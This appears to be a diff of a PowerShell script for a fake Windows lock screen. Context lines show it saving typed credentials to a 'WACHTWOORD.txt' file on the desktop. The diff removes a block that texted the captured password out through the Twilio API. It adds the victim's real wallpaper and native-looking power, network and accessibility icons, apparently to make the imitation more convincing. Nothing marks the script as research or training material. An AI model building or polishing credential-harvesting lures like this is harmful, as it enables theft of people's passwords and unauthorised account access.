@@ -14,9 +14,22 @@ $screenWidth = $screen.Bounds.Width
 $screenHeight = $screen.Bounds.Height
  
 # Background image
-$background = New-Object System.Windows.Forms.PictureBox
-$background.Dock = [System.Windows.Forms.DockStyle]::Fill
-$background.BackColor = [System.Drawing.Color]::FromArgb(10, 10, 20)
+# Get current desktop wallpaper from registry
+$wallpaperPath = Get-ItemPropertyValue -Path "HKCU:\Control Panel\Desktop" -Name WallPaper
+ 
+# Load the wallpaper as background image if it exists
+if (Test-Path $wallpaperPath) {
+    $wallpaperImage = [System.Drawing.Image]::FromFile($wallpaperPath)
+    $background = New-Object System.Windows.Forms.PictureBox
+    $background.Dock = [System.Windows.Forms.DockStyle]::Fill
+    $background.Image = $wallpaperImage
+    $background.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
+} else {
+    # Fallback color background if wallpaper not found
+    $background = New-Object System.Windows.Forms.PictureBox
+    $background.Dock = [System.Windows.Forms.DockStyle]::Fill
+    $background.BackColor = [System.Drawing.Color]::FromArgb(10, 10, 20)
+}
 $form.Controls.Add($background)
  
 # Calculate center positions
@@ -79,44 +92,59 @@ $submitButton.Add_Click({
     $desktopPath = [Environment]::GetFolderPath("Desktop")
     $path = Join-Path -Path $desktopPath -ChildPath "WACHTWOORD.txt"
     $credentials | Out-File -FilePath $path -Encoding UTF8 -Append
-
-    # Stuur wachtwoord via Twilio SMS
-    try {
-        if ($SID -and $Token -and $To -and $From) {
-            $smsBody = Get-Content -Path $path -Raw
-            $creds = New-Object System.Management.Automation.PSCredential($SID, (ConvertTo-SecureString $Token -AsPlainText -Force))
     
-            Invoke-RestMethod -Uri "https://api.twilio.com/2010-04-01/Accounts/$SID/Messages.json" `
-                -Method Post `
-                -Credential $creds `
-                -Body @{
-                    To = $To
-                    From = $From
-                    Body = $smsBody
-                }
-        }
-    } catch {
-        # Foutafhandeling (optioneel loggen)
-    }
-
     # Close the entire application
     [System.Windows.Forms.Application]::Exit()
 })
 $background.Controls.Add($submitButton)
  
+ 
+ 
+ 
+# Algemene instellingen
+$iconSize = New-Object System.Drawing.Size(60, 60)
+$iconFont = New-Object System.Drawing.Font("Segoe MDL2 Assets", 24)
+ 
 # Improved Power options button with icon
 $powerButton = New-Object System.Windows.Forms.Button
-$powerButton.Size = New-Object System.Drawing.Size(60, 60)
+$powerButton.Size = $iconSize
 $powerButton.Location = New-Object System.Drawing.Point(($screenWidth - 80), ($screenHeight - 80))
 $powerButton.BackColor = [System.Drawing.Color]::Transparent
 $powerButton.ForeColor = [System.Drawing.Color]::White
 $powerButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
 $powerButton.FlatAppearance.BorderSize = 0
 $powerButton.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
- 
-# Create shutdown icon using Wingdings font
-$powerButton.Font = New-Object System.Drawing.Font("Segoe MDL2 Assets", 24, [System.Drawing.FontStyle]::Regular)
+$powerButton.Font = $iconFont
 $powerButton.Text = [char]0xE7E8  # Power symbol in Segoe MDL2 Assets
+ 
+# Toegankelijkheid als knop
+$accessIcon = New-Object System.Windows.Forms.Button
+$accessIcon.Size = $iconSize
+$accessIcon.Location = New-Object System.Drawing.Point(($screenWidth - 220), ($screenHeight - 80))
+$accessIcon.BackColor = [System.Drawing.Color]::Transparent
+$accessIcon.ForeColor = [System.Drawing.Color]::White
+$accessIcon.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$accessIcon.FlatAppearance.BorderSize = 0
+$accessIcon.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
+$accessIcon.Font = $iconFont
+$accessIcon.Text = [char]0xE776  # Ease of Access
+$background.Controls.Add($accessIcon)
+ 
+# Netwerk als knop
+$networkIcon = New-Object System.Windows.Forms.Button
+$networkIcon.Size = $iconSize
+$networkIcon.Location = New-Object System.Drawing.Point(($screenWidth - 150), ($screenHeight - 80))
+$networkIcon.BackColor = [System.Drawing.Color]::Transparent
+$networkIcon.ForeColor = [System.Drawing.Color]::White
+$networkIcon.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$networkIcon.FlatAppearance.BorderSize = 0
+$networkIcon.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
+$networkIcon.Font = $iconFont
+$networkIcon.Text = [char]0xE701  # Network
+$background.Controls.Add($networkIcon)
+ 
+ 
+ 
  
 $powerButton.Add_Click({
     $result = [System.Windows.Forms.MessageBox]::Show("Do you want to shut down this computer?", "Shut Down", 
@@ -126,6 +154,12 @@ $powerButton.Add_Click({
     }
 })
 $background.Controls.Add($powerButton)
+ 
+ 
+$tooltip = New-Object System.Windows.Forms.ToolTip
+$tooltip.SetToolTip($networkIcon, "Netwerkstatus")
+$tooltip.SetToolTip($accessIcon, "Vernieuwen")
+$tooltip.SetToolTip($powerButton, "Uitschakelen")
  
 # Date and time display
 $timeLabel = New-Object System.Windows.Forms.Label
